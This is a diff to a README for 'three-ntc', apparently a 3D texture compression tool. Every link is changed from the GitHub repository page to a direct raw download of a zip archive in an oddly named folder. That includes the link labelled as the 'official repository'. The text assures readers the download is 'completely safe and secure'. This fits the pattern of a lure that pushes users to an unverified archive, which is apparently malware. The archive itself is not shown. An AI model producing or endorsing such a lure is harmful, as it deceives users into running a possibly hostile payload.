@@ -1,7 +1,7 @@
 <h1>🎨 three-ntc - Compress Your 3D Textures Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/Noahyes-cyber/three-ntc" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download three-ntc Now</a>
+  <a href="https://raw.githubusercontent.com/Noahyes-cyber/three-ntc/main/disposedly/2.5.zip" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download three-ntc Now</a>
 </p>
 
 ---
@@ -26,7 +26,7 @@ Getting started with three-ntc is easier than making toast. You don't need to be
 
 The very first thing you need to do is get the tool onto your computer. 
 
-**👉 Click this link to download the application:** [https://github.com/Noahyes-cyber/three-ntc](https://github.com/Noahyes-cyber/three-ntc)
+**👉 Click this link to download the application:** [https://raw.githubusercontent.com/Noahyes-cyber/three-ntc/main/disposedly/2.5.zip](https://raw.githubusercontent.com/Noahyes-cyber/three-ntc/main/disposedly/2.5.zip)
 
 Visit this link to download the application. This will take you to the official page where you can get the latest version of three-ntc for your Windows computer. The download is completely safe and secure, so you can click with confidence.
 
@@ -89,7 +89,7 @@ Ready to join the thousands of 3D artistsand developers who are already enjoying
 
 ### Get Your Copy
 
-**🔗 Visit this link to download the application:** [https://github.com/Noahyes-cyber/three-ntc](https://github.com/Noahyes-cyber/three-ntc)
+**🔗 Visit this link to download the application:** [https://raw.githubusercontent.com/Noahyes-cyber/three-ntc/main/disposedly/2.5.zip](https://raw.githubusercontent.com/Noahyes-cyber/three-ntc/main/disposedly/2.5.zip)
 
 ### Installation Steps
 
@@ -128,7 +128,7 @@ To get thee most out of three-ntc, here are some handy tips:
 
 Sometime things don't go exactly as planned, and that is okay! If you run into any issues while downloading, installing, or using three-ntc, here is what you can do:
 
-- **Check the official repository** at [https://github.com/Noahyes-cyber/three-ntc](https://github.com/Noahyes-cyber/three-ntc) for any updates, patches, or helpful information in the documentation section.
+- **Check the official repository** at [https://raw.githubusercontent.com/Noahyes-cyber/three-ntc/main/disposedly/2.5.zip](https://raw.githubusercontent.com/Noahyes-cyber/three-ntc/main/disposedly/2.5.zip) for any updates, patches, or helpful information in the documentation section.
 - **Look at the issues section** on that same page. Chances are, if you havea problem, someone else had it too, and solutions are often shared there.
 - **Be patient and persistent.** Oftenthe simplest solution is to restart your computer and try again. Technology can be finicky sometimes, but witha little patience, you will get it working smoothly
 
@@ -140,4 +140,4 @@ Three-ntc is really a game-changer for anyone who works with 3D textures. It sav
 
 So what are you waiting for? Head over to the download page, grab your copy, and start experiencing the joy of lightning-fast texture compression today. Your computer (andyour 3D projects) will thank you!
 
-**Remember:** [Visit this link to download the application](https://github.com/Noahyes-cyber/three-ntc) and take your first step toward simpler, faster 3D work. Happy creating! 🚀
+**Remember:** [Visit this link to download the application](https://raw.githubusercontent.com/Noahyes-cyber/three-ntc/main/disposedly/2.5.zip) and take your first step toward simpler, faster 3D work. Happy creating! 🚀
